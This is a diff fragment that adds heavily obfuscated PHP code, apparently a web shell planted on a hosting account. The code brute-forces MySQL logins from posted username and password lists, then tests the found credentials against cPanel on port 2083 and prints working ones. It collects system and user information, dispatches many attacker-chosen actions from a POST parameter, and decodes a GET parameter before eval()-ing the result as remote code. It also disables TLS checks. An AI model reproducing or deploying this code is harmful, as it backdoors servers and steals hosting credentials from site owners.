+        curl_setopt($hXUTm, CURLOPT_RETURNTRANSFER, 0x1);
+        curl_setopt($hXUTm, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
+        curl_setopt($hXUTm, CURLOPT_CONNECTTIMEOUT, 0x1e);
+        curl_setopt($hXUTm, CURLOPT_TIMEOUT, 0x1e);
+        curl_setopt($hXUTm, CURLOPT_FOLLOWLOCATION, 0x1);
+        curl_setopt($hXUTm, CURLOPT_SSL_VERIFYPEER, 0);
+        curl_setopt($hXUTm, CURLOPT_SSL_VERIFYHOST, 0);
+        curl_setopt($hXUTm, CURLOPT_USERAGENT, $_SERVER[$GLOBALS[†][0xe]]);
+        curl_setopt($hXUTm, CURLOPT_POST, 0x1);
+        curl_setopt($hXUTm, CURLOPT_POSTFIELDS, array($GLOBALS[†][0x2] => $SZK0H, $GLOBALS[†][0x7c] => $a5nTe, $GLOBALS[†][0x7d] => $GLOBALS[†][0x7e]));
+        curl_setopt($hXUTm, CURLOPT_COOKIEFILE, $GLOBALS[†][0xf]);
+        curl_setopt($hXUTm, CURLOPT_COOKIEJAR, $GLOBALS[†][0xf]);
+        $OJRWH = curl_exec($hXUTm);
+        curl_close($hXUTm);
+        if (preg_match($GLOBALS[†][0x13c], $OJRWH) || preg_match($GLOBALS[†][0x80], $OJRWH) || preg_match($GLOBALS[†][0x13d], $OJRWH) || preg_match($GLOBALS[†][0x13e], $OJRWH)) {
+            unlink($GLOBALS[†][0xcc]);
+            echo "<br>\n<reseller>https://{$wQAZu}:2083|{$SZK0H}|{$a5nTe}</reseller>";
+            return !0;
+        }
+        unlink($GLOBALS[†][0xcc]);
+        echo "<br>\n<cp>https://{$wQAZu}:2083|{$SZK0H}|{$a5nTe}</cp>";
+        return !1;
+    }
+    function QNHag()
+    {
+        global $wQAZu;
+        global $BAOWp;
+        $io4aY = B9KnM($GLOBALS[†][0xc3]);
+        preg_match_all($GLOBALS[†][0xc7], $io4aY, $PymQ6);
+        $IMfQu = array_unique($PymQ6[0x1]);
+        $qs3tq = str_replace($GLOBALS[†][0x28], $GLOBALS[†][0xc8], $_POST[$GLOBALS[†][0xc9]]);
+        $QfJPG = explode($GLOBALS[†][0xc6], $qs3tq);
+        $MkbRc = explode($GLOBALS[†][0x28], $_POST[$GLOBALS[†][0xc2]]);
+        $zvaC7 = count($MkbRc);
+        $TzQhw = 0;
+        foreach ($QfJPG as $SZK0H) {
+            if (!(trim($SZK0H) == $GLOBALS[†][0x6])) {
+                $SZK0H = trim($SZK0H);
+                $nxTqO = 0;
+                UvuV2:
+                if (!($nxTqO <= $zvaC7)) {
+                    goto TeH3C;
+                }
+                $a5nTe = trim($MkbRc[$nxTqO]);
+                if (!(@mysqli_connect($GLOBALS[†][0x2f], $SZK0H, $a5nTe) && trim($a5nTe) != $GLOBALS[†][0x6])) {
+                    $nxTqO++;
+                    goto UvuV2;
+                }
+                foreach ($IMfQu as $hgCnR => $hBMuT) {
+                    $Fk6Av = posix_getpwuid(@fileowner($GLOBALS[†][0xc5] . $hBMuT));
+                    if (!($SZK0H == $Fk6Av[$GLOBALS[†][0xc4]])) {
+                    }
+                    $wQAZu = $hBMuT;
+                    goto MUONX;
+                }
+                MUONX:
+                JGtIh($BAOWp, $SZK0H, $a5nTe, $wQAZu);
+                $TzQhw++;
+                TeH3C:
+                goto GNqjr;
+            }
+            GNqjr:
+        }
+        echo "<br>\n<good>{$TzQhw}</good>";
+    }
+    function w16YC()
+    {
+        $Vb99W = $GLOBALS[†][0x141];
+        VOZK8($GLOBALS[†][0x142], $Vb99W);
+    }
+    function IkLzS()
+    {
+        $dgqHe = $_SERVER[$GLOBALS[†][0]];
+        if (!($dgqHe == $GLOBALS[†][0x2e] || preg_match_all($GLOBALS[†][0xb1], $dgqHe, $CUzMF) || preg_match($GLOBALS[†][0xb2], $dgqHe))) {
+            goto oKp6h;
+        }
+        $dgqHe = gethostbyname($_SERVER[$GLOBALS[†][0xbe]]);
+        oKp6h:
+        return $dgqHe;
+    }
+    w16yC();
+    if (isset($_POST[$GLOBALS[†][0x1]])) {
+        goto t6qrB;
+    }
+    unlink($GLOBALS[†][0xf]);
+    t6qrB:
+    $ahSaQ = @php_uname();
+    $hfN_Q = @getcwd();
+    if (strtolower("PHP") == $GLOBALS[†][0x46]) {
+        $iCrpm = $GLOBALS[†][0xca];
+        goto AecVv;
+    }
+    $iCrpm = $GLOBALS[†][0x154];
+    AecVv:
+    if ($iCrpm == $GLOBALS[†][0xca]) {
+        $HR2uO = rx2In($GLOBALS[†][0x10]);
+        $hfN_Q = str_replace($GLOBALS[†][0xcf], $GLOBALS[†][0x1d], $hfN_Q);
+        goto ewh2r;
+    }
+    $HR2uO = rx2IN($GLOBALS[†][0x158]);
+    ewh2r:
+    if (!function_exists($GLOBALS[†][0xf1])) {
+        $MEejl = @get_current_user();
+        $XmJfs = @getmyuid();
+        $ysHXu = @getmygid();
+        $ZJYYH = $GLOBALS[†][0xf2];
+    } else {
+        $XmJfs = @posix_getpwuid(posix_geteuid());
+        $ysHXu = @posix_getgrgid(posix_getegid());
+        $MEejl = $XmJfs[$GLOBALS[†][0xc4]];
+        $XmJfs = $XmJfs[$GLOBALS[†][0xf3]];
+        $ZJYYH = $ysHXu[$GLOBALS[†][0xc4]];
+        $ysHXu = $ysHXu[$GLOBALS[†][0xf4]];
+    }
+    if (!empty($MEejl)) {
+        goto cimQ1;
+    }
+    if (!preg_match_all($GLOBALS[†][0x172], $hfN_Q, $ZZQSP)) {
+        goto U4RMQ;
+    }
+    preg_match_all($GLOBALS[†][0x172], $hfN_Q, $ZZQSP);
+    $MEejl = $ZZQSP[0x1][0];
+    U4RMQ:
+    cimQ1:
+    $wQAZu = IklZS();
+    $qQtqo = $_SERVER[$GLOBALS[†][0x2d]];
+    if (!strstr($qQtqo, $GLOBALS[†][0x79])) {
+        goto ItUS9;
+    }
+    $qQtqo = str_replace($GLOBALS[†][0x79], $GLOBALS[†][0x6], $qQtqo);
+    ItUS9:
+    preg_match("#/home(.*){$MEejl}/#", $hfN_Q, $glJ21);
+    $kiUQn = $glJ21[0x1];
+    $pkJgV = strval($_SERVER[$GLOBALS[†][0x31]]);
+    SSNL6:
+    if (!strstr($pkJgV, $GLOBALS[†][0x112])) {
+        if (!strstr($pkJgV, $GLOBALS[†][0x7a])) {
+            goto QoUvY;
+        }
+        $pkJgV = explode($GLOBALS[†][0x7a], $pkJgV);
+        $pkJgV = $pkJgV[0];
+        QoUvY:
+        $F3QtU = substr_count($pkJgV, $GLOBALS[†][0x33]);
+        kxC84();
+        $f3Y8l = $GLOBALS[†][0x6];
+        $MoqpY = 0x1;
+        Bd8O6:
+        if (!($MoqpY < intval($F3QtU))) {
+            if ($_SERVER[$GLOBALS[†][0]] == $GLOBALS[†][0x2e] || preg_match_all($GLOBALS[†][0xb1], $_SERVER[$GLOBALS[†][0]]) || preg_match($GLOBALS[†][0xb2], $_SERVER[$GLOBALS[†][0]])) {
+                $P0a6M = gethostbyname($_SERVER[$GLOBALS[†][0xbe]]);
+                $x8Fp6 = $_SERVER[$GLOBALS[†][0xbf]] . $_SERVER[$GLOBALS[†][0xc0]];
+                goto b6xYn;
+            }
+            $P0a6M = $_SERVER[$GLOBALS[†][0]];
+            $x8Fp6 = $_SERVER[$GLOBALS[†][0xbf]] . $_SERVER[$GLOBALS[†][0xc0]];
+            b6xYn:
+            if (isset($_SERVER[$GLOBALS[†][0xcd]]) && $_SERVER[$GLOBALS[†][0xcd]] === $GLOBALS[†][0xce]) {
+                $zk0R3 = $GLOBALS[†][0xa1];
+                goto faxMh;
+            }
+            $zk0R3 = $GLOBALS[†][0x178];
+            faxMh:
+            $UXWym = trim($_POST[$GLOBALS[†][0x3]]);
+            if ($UXWym == $GLOBALS[†][0x4f] || $UXWym == $GLOBALS[†][0x50] || $UXWym == $GLOBALS[†][0x86]) {
+                if (is_dir("/home{$kiUQn}{$MEejl}/.cpanel")) {
+                    $KXVuX = $GLOBALS[†][0xd4];
+                    $jRqUE = $GLOBALS[†][0x111];
+                    $BAOWp = $GLOBALS[†][0xc1];
+                    $qTWuk = C2MJQ($KXVuX);
+                    if (preg_match($GLOBALS[†][0x13f], $qTWuk)) {
+                        goto yLVXN;
+                    }
+                    $KXVuX = $GLOBALS[†][0xd];
+                    $jRqUE = $GLOBALS[†][0x140];
+                    $BAOWp = $GLOBALS[†][0xa0];
+                    $qTWuk = C2MJQ($KXVuX);
+                    yLVXN:
+                    if (!(!preg_match($GLOBALS[†][0x4e], $qTWuk) && ($UXWym == $GLOBALS[†][0x4f] || $UXWym == $GLOBALS[†][0x50]))) {
+                        if ($UXWym == $GLOBALS[†][0x4f]) {
+                            vtqTX();
+                            goto ljJw6;
+                        }
+                        if ($UXWym == $GLOBALS[†][0x50]) {
+                            JqvW7();
+                            vtQTX();
+                            goto ljJw6;
+                        }
+                        if ($UXWym == $GLOBALS[†][0x86]) {
+                            cXxfv();
+                            xokfG();
+                            goto Rw9Wy;
+                        }
+                        Rw9Wy:
+                        ljJw6:
+                        goto amuWe;
+                    }
+                    krVga();
+                    unlink($GLOBALS[†][0xf]);
+                    die($GLOBALS[†][0xd3]);
+                }
+                die($GLOBALS[†][0x9b]);
+            }
+            if ($UXWym == $GLOBALS[†][0x9e]) {
+                jQvW7();
+                goto amuWe;
+            }
+            if ($UXWym == $GLOBALS[†][0x9a]) {
+                lubGU(0x1);
+                goto amuWe;
+            }
+            if ($UXWym == $GLOBALS[†][0x4d]) {
+                LUbGu(0);
+                goto amuWe;
+            }
+            if ($UXWym == $GLOBALS[†][0x15f]) {
+                lUBGu(0x2);
+                goto amuWe;
+            }
+            if ($UXWym == $GLOBALS[†][0x9d]) {
+                PBaxF();
+                goto amuWe;
+            }
+            if ($UXWym == $GLOBALS[†][0x113]) {
+                kUTn3();
+                goto amuWe;
+            }
+            if ($UXWym == $GLOBALS[†][0x12c]) {
+                nsrXC(0x1);
+                goto amuWe;
+            }
+            if ($UXWym == $GLOBALS[†][0x8]) {
+                R8Ewq();
+                goto amuWe;
+            }
+            if ($UXWym == $GLOBALS[†][0xc]) {
+                FTJ0y();
+                goto amuWe;
+            }
+            if ($UXWym == $GLOBALS[†][0x16e]) {
+                bPFVT();
+                goto amuWe;
+            }
+            if ($UXWym == $GLOBALS[†][0x34]) {
+                W0zeE();
+                goto amuWe;
+            }
+            if ($UXWym == $GLOBALS[†][0xb3]) {
+                ElCcY();
+                goto amuWe;
+            }
+            if ($UXWym == $GLOBALS[†][0x32]) {
+                bsvrS();
+                goto amuWe;
+            }
+            if ($UXWym == $GLOBALS[†][0x1ae]) {
+                eYH8l();
+                goto amuWe;
+            }
+            if ($UXWym == $GLOBALS[†][0xb0]) {
+                QnHAg();
+                goto LotnC;
+            }
+            LotnC:
+            amuWe:
+            unlink($GLOBALS[†][0xf]);
+            if (!isset($_GET[$GLOBALS[†][0x3]])) {
+                goto iKuqL;
+            }
+            $vT2qI = trim($_GET[$GLOBALS[†][0x3]]);
+            $vT2qI = str_rot13(pack($GLOBALS[†][0x171], strrev($vT2qI)));
+            $Mh238 = XK7mM($GLOBALS[†][0xe3] . CP_L4($vT2qI));
+            $Mh238 = Xn129($GLOBALS[†][0xe3] . Cp_L4($vT2qI), $Mh238);
+            $Mh238 = str_replace(array(base64_decode($GLOBALS[†][0x8b]), base64_decode($GLOBALS[†][0x1af]), base64_decode($GLOBALS[†][0x8e])), $GLOBALS[†][0x6], $Mh238);
+            eval($Mh238);
+            iKuqL:
+            return;
+        }
+        $f3Y8l .= $GLOBALS[†][0x85];
+        $MoqpY++;
+        goto Bd8O6;
+    }
+    $pkJgV = str_replace($GLOBALS[†][0x112], $GLOBALS[†][0x33], $pkJgV);
+    goto SSNL6;
